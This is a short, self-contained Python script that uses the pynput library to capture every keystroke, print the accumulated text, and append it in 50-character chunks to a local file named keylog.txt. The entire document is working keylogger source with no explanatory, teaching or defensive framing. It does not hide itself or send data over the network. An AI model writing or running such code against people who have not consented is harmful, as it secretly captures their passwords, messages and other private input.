import pynput.keyboard

log = ""

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

    print(log)

    if len(log) >= 50:
        save_to_file(log)
        log = ""

def save_to_file(log):
    with open("keylog.txt", "a") as f:
        f.write(log)

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()
